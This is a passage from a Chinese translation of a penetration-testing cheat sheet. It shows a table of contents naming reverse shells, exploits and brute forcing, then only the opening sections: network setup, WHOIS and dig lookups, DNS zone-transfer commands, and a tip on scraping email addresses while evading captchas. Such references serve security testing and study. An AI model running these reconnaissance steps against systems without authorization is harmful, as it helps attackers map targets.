aria-label="SAMB / SMB / Windows 域枚举">SAMB / SMB / Windows 域枚举</a><ul><li><a href=#samba%e6%9e%9a%e4%b8%be aria-label=Samba枚举>Samba枚举</a><ul><li><a href=#smb%e6%9e%9a%e4%b8%be%e5%b7%a5%e5%85%b7 aria-label=SMB枚举工具>SMB枚举工具</a></li><li><a href=#smb-%e7%89%88%e6%9c%ac%e6%8c%87%e7%ba%b9%e8%af%86%e5%88%ab aria-label="SMB 版本指纹识别">SMB 版本指纹识别</a></li><li><a href=#%e5%af%bb%e6%89%be%e5%bc%80%e6%94%be%e7%9a%84smb%e5%85%b1%e4%ba%ab aria-label=寻找开放的SMB共享>寻找开放的SMB共享</a></li><li><a href=#%e6%9e%9a%e4%b8%besmb%e7%94%a8%e6%88%b7 aria-label=枚举SMB用户>枚举SMB用户</a><ul><li><a href=#%e6%89%8b%e5%8a%a8%e6%b5%8b%e8%af%95%e7%a9%ba%e4%bc%9a%e8%af%9d aria-label=手动测试空会话>手动测试空会话</a></li><li><a href=#nbtscan-unixwiz aria-label="NBTScan unixwiz">NBTScan unixwiz</a></li></ul></li></ul></li><li><a href=#llmnr--nbt-ns%e6%ac%ba%e9%aa%97 aria-label="LLMNR / NBT-NS欺骗">LLMNR / NBT-NS欺骗</a><ul><li><a href=#%e4%bd%bf%e7%94%a8metasploit%e8%bf%9b%e8%a1%8c-llmnr--netbios%e8%af%b7%e6%b1%82 aria-label="使用Metasploit进行 LLMNR / NetBIOS请求">使用Metasploit进行 LLMNR / NetBIOS请求</a></li><li><a href=#responderpy aria-label=Responder.py>Responder.py</a></li></ul></li><li><a href=#snmp%e6%9e%9a%e4%b8%be%e5%b7%a5%e5%85%b7 aria-label=SNMP枚举工具>SNMP枚举工具</a><ul><li><a href=#snmpv3%e6%9e%9a%e4%b8%be%e5%b7%a5%e5%85%b7 aria-label=SNMPv3枚举工具>SNMPv3枚举工具</a></li></ul></li><li><a href=#%e8%bf%9c%e7%a8%8b%e6%9c%8d%e5%8a%a1%e6%9e%9a%e4%b8%be aria-label=远程服务枚举>远程服务枚举</a><ul><li><a href=#rsh-%e6%9e%9a%e4%b8%be aria-label="RSH 枚举">RSH 枚举</a><ul><li><a href=#rsh%e8%bf%90%e8%a1%8c%e5%91%bd%e4%bb%a4 aria-label=RSH运行命令>RSH运行命令</a></li><li><a href=#metasploitrsh-%e7%99%bb%e9%99%86%e6%89%ab%e6%8f%8f aria-label="MetasploitRSH 登陆扫描">MetasploitRSH 登陆扫描</a></li><li><a href=#%e4%bd%bf%e7%94%a8rusers%e6%98%be%e7%a4%ba%e5%b7%b2%e7%99%bb%e9%99%86%e7%94%a8%e6%88%b7 aria-label=使用rusers显示已登陆用户>使用rusers显示已登陆用户</a></li><li><a href=#%e4%bd%bf%e7%94%a8rlogin%e6%89%ab%e6%8f%8f%e6%95%b4%e4%b8%aa%e5%ad%90%e7%bd%91 aria-label=使用rlogin扫描整个子网>使用rlogin扫描整个子网</a></li></ul></li></ul></li><li><a href=#%e4%bd%bf%e7%94%a8finger%e6%9e%9a%e4%b8%be aria-label=使用finger枚举>使用finger枚举</a><ul><li><a href=#%e5%88%a9%e7%94%a8solaris%e7%9a%84bug%e6%98%be%e7%a4%ba%e6%89%80%e6%9c%89%e5%b7%b2%e7%99%bb%e5%bd%95%e7%94%a8%e6%88%b7 aria-label=利用Solaris的bug显示所有已登录用户>利用Solaris的bug显示所有已登录用户</a></li></ul></li><li><a href=#rwho aria-label=rwho>rwho</a></li></ul></li></ul></li><li><a href=#tlsssl-%e6%b5%8b%e8%af%95 aria-label="TLS&amp;amp;SSL 测试">TLS&amp;SSL 测试</a><ul><li><a href=#testsslsh aria-label=testssl.sh>testssl.sh</a></li></ul></li><li><a href=#%e6%bc%8f%e6%b4%9e%e8%af%84%e4%bc%b0 aria-label=漏洞评估>漏洞评估</a></li><li><a href=#%e6%95%b0%e6%8d%ae%e5%ba%93%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95 aria-label=数据库渗透测试>数据库渗透测试</a><ul><li><a href=#oracle aria-label=Oracle>Oracle</a><ul><li><a href=#oracle-tns%e7%89%88%e6%9c%ac%e6%8c%87%e7%ba%b9%e8%af%86%e5%88%ab aria-label="Oracle TNS版本指纹识别">Oracle TNS版本指纹识别</a></li><li><a href=#%e7%88%86%e7%a0%b4oracle%e8%b4%a6%e6%88%b7 aria-label=爆破Oracle账户>爆破Oracle账户</a></li><li><a href=#oracle%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87 aria-label=Oracle权限提升>Oracle权限提升</a><ul><li><a href=#%e4%bd%bf%e7%94%a8nmap-nse%e8%84%9a%e6%9c%ac%e9%aa%8c%e8%af%81oracle%e6%95%b0%e6%8d%ae%e5%ba%93%e4%b8%ad%e7%9a%84%e9%bb%98%e8%ae%a4%e8%b4%a6%e6%88%b7 aria-label="使用NMAP NSE脚本验证oracle数据库中的默认账户：">使用NMAP NSE脚本验证oracle数据库中的默认账户：</a></li><li><a href=#%e7%a1%ae%e8%ae%a4%e4%b8%80%e4%b8%aaoracle%e7%94%a8%e6%88%b7%e7%9a%84%e6%9d%83%e9%99%90%e7%ba%a7%e5%88%ab aria-label=确认一个oracle用户的权限级别>确认一个oracle用户的权限级别</a></li><li><a href=#oracle%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87%e5%92%8c%e8%ae%bf%e9%97%aedba aria-label=Oracle权限提升和访问DBA>Oracle权限提升和访问DBA</a></li><li><a href=#%e8%bf%90%e8%a1%8c%e6%9f%a5%e8%af%a2%e8%af%ad%e5%8f%a5 aria-label=运行查询语句>运行查询语句</a></li><li><a href=#%e7%a7%bb%e9%99%a4%e5%88%a9%e7%94%a8%e7%97%95%e8%bf%b9 aria-label=移除利用痕迹：>移除利用痕迹：</a></li><li><a href=#%e8%8e%b7%e5%8f%96oracle%e5%8f%8d%e5%bc%b9shell aria-label=获取Oracle反弹shell：>获取Oracle反弹shell：</a></li></ul></li></ul></li><li><a href=#mssql aria-label=MSSQL>MSSQL</a><ul><li><a href=#%e7%88%86%e7%a0%b4-mssql%e7%99%bb%e9%99%86 aria-label="爆破 MSSQL登陆">爆破 MSSQL登陆</a></li><li><a href=#metasploit-mssql-shell aria-label="Metasploit MSSQL Shell">Metasploit MSSQL Shell</a></li></ul></li></ul></li><li><a href=#%e7%bd%91%e7%bb%9c aria-label=网络>网络</a><ul><li><a href=#plinkexe-%e9%9a%a7%e9%81%93 aria-label="Plink.exe 隧道">Plink.exe 隧道</a></li><li><a href=#%e8%b7%b3%e6%9d%bfpivoting aria-label=跳板（Pivoting）>跳板（Pivoting）</a><ul><li><a href=#ssh-%e8%b7%b3%e6%9d%bfssh-pivoting aria-label="SSH 跳板（ssh Pivoting）">SSH 跳板（ssh Pivoting）</a></li><li><a href=#meterpreter-pivoting aria-label="Meterpreter Pivoting">Meterpreter Pivoting</a></li></ul></li><li><a href=#ttl-%e6%8c%87%e7%ba%b9%e8%af%86%e5%88%ab aria-label="TTL 指纹识别">TTL 指纹识别</a></li><li><a href=#ipv4-%e9%80%9f%e6%9f%a5 aria-label="IPv4 速查">IPv4 速查</a><ul><li><a href=#%e5%90%84%e7%b1%bbip%e7%9a%84%e5%9c%b0%e5%9d%80%e8%8c%83%e5%9b%b4 aria-label=各类IP的地址范围>各类IP的地址范围</a></li><li><a href=#ipv4%e7%a7%81%e6%9c%89%e5%9c%b0%e5%9d%80 aria-label=IPv4私有地址>IPv4私有地址</a></li><li><a href=#ipv4%e5%ad%90%e7%bd%91%e9%80%9f%e6%9f%a5%e8%a1%a8 aria-label=IPv4子网速查表>IPv4子网速查表</a></li></ul></li><li><a href=#vlan-hopping%e8%b7%b3%e8%b7%83%e6%94%bb%e5%87%bb aria-label="VLAN hopping（跳跃攻击）">VLAN hopping（跳跃攻击）</a></li><li><a href=#vpn%e6%b5%8b%e8%af%95%e5%b7%a5%e5%85%b7 aria-label=VPN测试工具>VPN测试工具</a><ul><li><a href=#ikeforce aria-label=IKEForce>IKEForce</a></li><li><a href=#ike-%e6%bf%80%e8%bf%9b%e6%a8%a1%e5%bc%8f-psk-%e7%a0%b4%e8%a7%a3 aria-label="IKE 激进模式 PSK 破解">IKE 激进模式 PSK 破解</a><ul><li><a href=#step-1-%e9%aa%8c%e8%af%81ike%e6%9c%8d%e5%8a%a1%e5%99%a8 aria-label="Step 1: 验证IKE服务器">Step 1: 验证IKE服务器</a></li><li><a href=#step-2%e4%bd%bf%e7%94%a8ikeforce%e6%9e%9a%e4%b8%be%e7%bb%84%e5%90%8d aria-label="Step 2:使用IKEForce枚举组名">Step 2:使用IKEForce枚举组名</a></li><li><a href=#step-3-%e4%bd%bf%e7%94%a8ike-scan%e6%8a%93%e5%8f%96psk%e5%93%88%e5%b8%8c aria-label="Step 3: 使用ike-scan抓取PSK哈希">Step 3: 使用ike-scan抓取PSK哈希</a></li><li><a href=#step-4-%e4%bd%bf%e7%94%a8psk-crack-%e7%a0%b4%e8%a7%a3psk-%e5%93%88%e5%b8%8c aria-label="Step 4: 使用psk-crack 破解PSK 哈希">Step 4: 使用psk-crack 破解PSK 哈希</a></li></ul></li><li><a href=#pptp-hacking aria-label="PPTP Hacking">PPTP Hacking</a><ul><li><a href=#nmap-pptp-%e6%8c%87%e7%ba%b9%e8%af%86%e5%88%ab aria-label="NMAP PPTP 指纹识别:">NMAP PPTP 指纹识别:</a></li><li><a href=#pptp%e5%ad%97%e5%85%b8%e6%94%bb%e5%87%bb aria-label=PPTP字典攻击>PPTP字典攻击</a></li></ul></li></ul></li><li><a href=#dns-%e9%9a%a7%e9%81%93 aria-label="DNS 隧道">DNS 隧道</a><ul><li><a href=#%e6%94%bb%e5%87%bb%e6%9c%ba%e5%99%a8 aria-label=攻击机器：>攻击机器：</a></li></ul></li></ul></li><li><a href=#bof--exploit aria-label="BOF / Exploit">BOF / Exploit</a></li><li><a href=#exploit-%e6%90%9c%e7%b4%a2 aria-label="Exploit 搜索">Exploit 搜索</a><ul><li><a href=#%e6%90%9c%e7%b4%a2exp aria-label=搜索EXP>搜索EXP</a></li><li><a href=#%e5%9c%a8kali%e4%b8%8a%e7%bc%96%e8%af%91windows%e7%9a%84exp aria-label=在Kali上编译WIndows的exp>在Kali上编译WIndows的exp</a></li><li><a href=#%e4%ba%a4%e5%8f%89%e7%bc%96%e8%af%91exploits aria-label=交叉编译Exploits>交叉编译Exploits</a></li><li><a href=#%e5%88%a9%e7%94%a8%e9%80%9a%e7%94%a8%e6%bc%8f%e6%b4%9e aria-label=利用通用漏洞>利用通用漏洞</a><ul><li><a href=#%e5%88%a9%e7%94%a8shellshock%e6%bc%8f%e6%b4%9e aria-label=利用Shellshock漏洞>利用Shellshock漏洞</a><ul><li><a href=#cat-file-%e6%9f%a5%e7%9c%8b%e6%96%87%e4%bb%b6%e5%86%85%e5%ae%b9 aria-label="cat file (查看文件内容)">cat file (查看文件内容)</a></li><li><a href=#shell-shock-%e8%bf%90%e8%a1%8cbind-shell aria-label="Shell Shock 运行bind shell">Shell Shock 运行bind shell</a></li><li><a href=#shell-shock-%e5%8f%8d%e5%bc%b9shell aria-label="Shell Shock 反弹shell">Shell Shock 反弹shell</a></li></ul></li></ul></li></ul></li><li><a href=#%e7%ae%80%e5%8d%95%e7%9a%84%e6%9c%ac%e5%9c%b0web%e6%9c%8d%e5%8a%a1%e5%99%a8 aria-label=简单的本地Web服务器>简单的本地Web服务器</a></li><li><a href=#%e6%8c%82%e8%bd%bd%e6%96%87%e4%bb%b6%e5%85%b1%e4%ba%ab aria-label=挂载文件共享>挂载文件共享</a></li><li><a href=#http--https-web%e6%9c%8d%e5%8a%a1%e6%9e%9a%e4%b8%be aria-label="HTTP / HTTPS Web服务枚举">HTTP / HTTPS Web服务枚举</a></li><li><a href=#%e6%95%b0%e6%8d%ae%e5%8c%85%e4%be%a6%e6%b5%8b aria-label=数据包侦测>数据包侦测</a></li><li><a href=#%e7%94%a8%e6%88%b7%e5%90%8d%e6%9e%9a%e4%b8%be aria-label=用户名枚举>用户名枚举</a><ul><li><a href=#smb-%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be aria-label="SMB 用户枚举">SMB 用户枚举</a></li><li><a href=#snmp-%e7%94%a8%e6%88%b7%e6%9e%9a%e4%b8%be aria-label="SNMP 用户枚举">SNMP 用户枚举</a></li></ul></li><li><a href=#%e5%af%86%e7%a0%81 aria-label=密码>密码</a><ul><li><a href=#%e5%ad%97%e5%85%b8 aria-label=字典>字典</a></li></ul></li><li><a href=#%e7%88%86%e7%a0%b4%e6%9c%8d%e5%8a%a1 aria-label=爆破服务>爆破服务</a><ul><li><a href=#%e4%bd%bf%e7%94%a8hydra-%e7%88%86%e7%a0%b4ftp aria-label="使用Hydra 爆破FTP">使用Hydra 爆破FTP</a></li><li><a href=#%e4%bd%bf%e7%94%a8hydra-%e7%88%86%e7%a0%b4pop3 aria-label="使用Hydra 爆破POP3">使用Hydra 爆破POP3</a></li><li><a href=#%e4%bd%bf%e7%94%a8hydra-%e7%88%86%e7%a0%b4smtp aria-label="使用Hydra 爆破SMTP">使用Hydra 爆破SMTP</a></li></ul></li><li><a href=#%e5%af%86%e7%a0%81%e7%a0%b4%e8%a7%a3 aria-label=密码破解>密码破解</a><ul><li><a href=#john-the-ripper---jtr aria-label="John The Ripper - JTR">John The Ripper - JTR</a></li></ul></li><li><a href=#windows-%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e5%91%bd%e4%bb%a4 aria-label="Windows 渗透测试命令">Windows 渗透测试命令</a></li><li><a href=#linux-%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e5%91%bd%e4%bb%a4 aria-label="Linux 渗透测试命令">Linux 渗透测试命令</a></li><li><a href=#%e7%bc%96%e8%af%91exp aria-label=编译EXP>编译EXP</a><ul><li><a href=#%e5%88%a4%e6%96%adc%e4%bb%a3%e7%a0%81%e9%80%82%e7%94%a8%e4%ba%8ewindows%e5%b9%b3%e5%8f%b0%e8%bf%98%e6%98%aflinux aria-label=判断C代码适用于Windows平台还是Linux>判断C代码适用于Windows平台还是Linux</a></li><li><a href=#%e4%bd%bf%e7%94%a8gcc%e7%bc%96%e8%af%91exploit aria-label=使用GCC编译Exploit>使用GCC编译Exploit</a></li><li><a href=#%e5%9c%a864%e4%bd%8d%e7%9a%84kali%e4%b8%8a%e7%94%a8gcc%e7%bc%96%e8%af%9132%e4%bd%8d%e7%9a%84exp aria-label=在64位的Kali上用GCC编译32位的EXP>在64位的Kali上用GCC编译32位的EXP</a></li><li><a href=#%e5%9c%a8-linux%e4%b8%8a%e7%bc%96%e8%af%91%e5%8f%af%e8%bf%90%e8%a1%8c%e4%ba%8ewindows%e7%9a%84exe%e6%96%87%e4%bb%b6 aria-label="在 Linux上编译可运行于Windows的exe文件">在 Linux上编译可运行于Windows的exe文件</a></li></ul></li><li><a href=#suid-%e4%ba%8c%e8%bf%9b%e5%88%b6 aria-label="SUID 二进制">SUID 二进制</a><ul><li><a href=#%e8%bf%90%e8%a1%8c-binbash%e7%9a%84suid-c-shell aria-label="运行 /bin/bash的SUID C Shell">运行 /bin/bash的SUID C Shell</a></li><li><a href=#%e8%bf%90%e8%a1%8c-binsh%e7%9a%84suid-c-shell aria-label="运行 /bin/sh的SUID C Shell">运行 /bin/sh的SUID C Shell</a></li><li><a href=#%e6%9e%84%e5%bb%ba-suid-shell-%e4%ba%8c%e8%bf%9b%e5%88%b6 aria-label="构建 SUID Shell 二进制">构建 SUID Shell 二进制</a></li></ul></li><li><a href=#%e5%8f%8d%e5%90%91shells aria-label=反向Shells>反向Shells</a></li><li><a href=#tty-shells aria-label="TTY Shells">TTY Shells</a><ul><li><a href=#%e7%94%a8python%e6%a8%a1%e6%8b%9f-tty-shell%e7%9a%84%e6%8a%80%e5%b7%a7 aria-label="用Python模拟 TTY Shell的技巧">用Python模拟 TTY Shell的技巧</a></li><li><a href=#%e7%94%a8sh%e6%a8%a1%e6%8b%9f%e4%ba%a4%e4%ba%92%e5%bc%8fshell aria-label=用sh模拟交互式shell>用sh模拟交互式shell</a></li><li><a href=#%e7%94%a8perl%e6%a8%a1%e6%8b%9f-tty-shell aria-label="用Perl模拟 TTY Shell">用Perl模拟 TTY Shell</a></li><li><a href=#%e7%94%a8ruby%e6%a8%a1%e6%8b%9f-tty-shell aria-label="用Ruby模拟 TTY Shell">用Ruby模拟 TTY Shell</a></li><li><a href=#%e7%94%a8lua-%e6%a8%a1%e6%8b%9ftty-shell aria-label="用Lua 模拟TTY Shell">用Lua 模拟TTY Shell</a></li><li><a href=#%e4%bb%8evi%e6%a8%a1%e6%8b%9ftty-shell aria-label="从Vi模拟TTY Shell">从Vi模拟TTY Shell</a></li><li><a href=#%e7%94%a8nmap%e6%a8%a1%e6%8b%9ftty-shell aria-label="用NMAP模拟TTY Shell">用NMAP模拟TTY Shell</a></li></ul></li><li><a href=#metasploit-%e9%80%9f%e6%9f%a5%e8%a1%a8 aria-label="Metasploit 速查表">Metasploit 速查表</a><ul><li><a href=#meterpreter-payloads aria-label="Meterpreter Payloads">Meterpreter Payloads</a></li><li><a href=#windows-%e5%8f%8d%e5%90%91meterpreter-payload aria-label="Windows 反向meterpreter payload">Windows 反向meterpreter payload</a></li><li><a href=#windows-vnc-meterpreter-payload aria-label="Windows VNC Meterpreter payload">Windows VNC Meterpreter payload</a></li><li><a href=#linux-%e5%8f%8d%e5%90%91meterpreter-payload aria-label="Linux 反向Meterpreter payload">Linux 反向Meterpreter payload</a></li></ul></li><li><a href=#meterpreter%e9%80%9f%e6%9f%a5%e8%a1%a8 aria-label=Meterpreter速查表>Meterpreter速查表</a></li><li><a href=#%e5%b8%b8%e7%94%a8metasploit-%e6%a8%a1%e5%9d%97 aria-label="常用Metasploit 模块">常用Metasploit 模块</a><ul><li><a href=#%e8%bf%9c%e7%a8%8bwindows-metasploit-%e6%a8%a1%e5%9d%97exploits aria-label="远程Windows Metasploit 模块(exploits)">远程Windows Metasploit 模块(exploits)</a></li><li><a href=#%e6%9c%ac%e5%9c%b0windows-metasploit-%e6%a8%a1%e5%9d%97exploits aria-label="本地Windows Metasploit 模块(exploits)">本地Windows Metasploit 模块(exploits)</a></li><li><a href=#%e8%be%85%e5%8a%a9metasploit-%e6%a8%a1%e5%9d%97 aria-label="辅助Metasploit 模块">辅助Metasploit 模块</a></li><li><a href=#metasploit-powershell-%e6%a8%a1%e5%9d%97 aria-label="Metasploit Powershell 模块">Metasploit Powershell 模块</a></li><li><a href=#windows-%e5%90%8e%e6%b8%97%e9%80%8fmetasploit-%e6%a8%a1%e5%9d%97 aria-label="Windows 后渗透Metasploit 模块">Windows 后渗透Metasploit 模块</a></li></ul></li><li><a href=#ascii%e8%a1%a8%e9%80%9f%e6%9f%a5 aria-label=ASCII表速查>ASCII表速查</a></li><li><a href=#cisco-ios%e7%bd%91%e9%99%85%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f-%e5%91%bd%e4%bb%a4 aria-label="CISCO IOS(网际操作系统) 命令">CISCO IOS(网际操作系统) 命令</a></li><li><a href=#%e5%af%86%e7%a0%81%e5%ad%a6 aria-label=密码学>密码学</a><ul><li><a href=#%e5%93%88%e5%b8%8c%e9%95%bf%e5%ba%a6 aria-label=哈希长度>哈希长度</a></li><li><a href=#%e5%93%88%e5%b8%8c%e4%be%8b%e5%ad%90 aria-label=哈希例子>哈希例子</a></li></ul></li><li><a href=#sqlmap%e4%be%8b%e5%ad%90 aria-label=SQLMap例子>SQLMap例子</a></li></ul></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h1 id=渗透测试工具备忘录>渗透测试工具备忘录<a hidden class=anchor aria-hidden=true href=#渗透测试工具备忘录>#</a></h1><p><strong>本文翻译自 <a href=https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/>Penetration Testing Tools Cheat Sheet</a> ，首发<a href=https://xz.aliyun.com/t/2446>先知社区</a> ，转载请注明链接。</strong></p><h2 id=简介>简介<a hidden class=anchor aria-hidden=true href=#简介>#</a></h2><p>渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 <a href=https://highon.coffee/blog/>本站</a> 其他备忘录。</p><p>本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参考《黑客攻防技术宝典》，这本书不管是用作专门学习还是参考手册都是很棒的。</p><p>文中缺漏之处欢迎 <a href=https://twitter.com/Arr0way>推特</a> 私戳。</p><h3 id=更新日志>更新日志：<a hidden class=anchor aria-hidden=true href=#更新日志>#</a></h3><p>17/02/2017 ：更新文章，增加VPN，DNS隧道，VLAN hopping（跳跃攻击） 等内容。</p><h2 id=开始前>开始前<a hidden class=anchor aria-hidden=true href=#开始前>#</a></h2><h3 id=网络配置>网络配置<a hidden class=anchor aria-hidden=true href=#网络配置>#</a></h3><h4 id=设置ip-地址>设置IP 地址<a hidden class=anchor aria-hidden=true href=#设置ip-地址>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ifconfig eth0 xxx.xxx.xxx.xxx/24
</span></span></code></pre></td></tr></table></div></div><h4 id=子网划分>子网划分<a hidden class=anchor aria-hidden=true href=#子网划分>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ipcalc xxx.xxx.xxx.xxx/24 
</span></span><span style=display:flex><span>ipcalc xxx.xxx.xxx.xxx 255.255.255.0 
</span></span></code></pre></td></tr></table></div></div><h2 id=公开来源情报>公开来源情报<a hidden class=anchor aria-hidden=true href=#公开来源情报>#</a></h2><h3 id=被动信息收集>被动信息收集<a hidden class=anchor aria-hidden=true href=#被动信息收集>#</a></h3><h4 id=dns>DNS<a hidden class=anchor aria-hidden=true href=#dns>#</a></h4><h5 id=whois-枚举>WHOIS 枚举<a hidden class=anchor aria-hidden=true href=#whois-枚举>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>whois domain-name-here.com 
</span></span></code></pre></td></tr></table></div></div><h5 id=查询dns-ip>查询DNS IP<a hidden class=anchor aria-hidden=true href=#查询dns-ip>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>dig a domain-name-here.com @nameserver 
</span></span></code></pre></td></tr></table></div></div><h5 id=查询mx记录>查询MX记录<a hidden class=anchor aria-hidden=true href=#查询mx记录>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>dig mx domain-name-here.com @nameserver
</span></span></code></pre></td></tr></table></div></div><h5 id=用dig-查询域传送>用DIG 查询域传送<a hidden class=anchor aria-hidden=true href=#用dig-查询域传送>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>dig axfr domain-name-here.com @nameserver
</span></span></code></pre></td></tr></table></div></div><h2 id=dns-域传送>DNS 域传送<a hidden class=anchor aria-hidden=true href=#dns-域传送>#</a></h2><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>nslookup -> set type=any -> ls -d blah.com</code></td><td>Windows DNS域传送</td></tr><tr><td><code>dig axfr blah.com @ns1.blah.com</code></td><td>Linux DNS 域传送</td></tr></tbody></table><h3 id=邮件>邮件<a hidden class=anchor aria-hidden=true href=#邮件>#</a></h3><h4 id=simply-email>Simply Email<a hidden class=anchor aria-hidden=true href=#simply-email>#</a></h4><p>使用Simply Email枚举所有所有网站（GitHub，目标站点等），配上代理或设置较长的访问间隔时间，这样就不会被Google发现是爬虫并用验证码拦住了。Simply Email还可以验证收集的邮件地址。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span 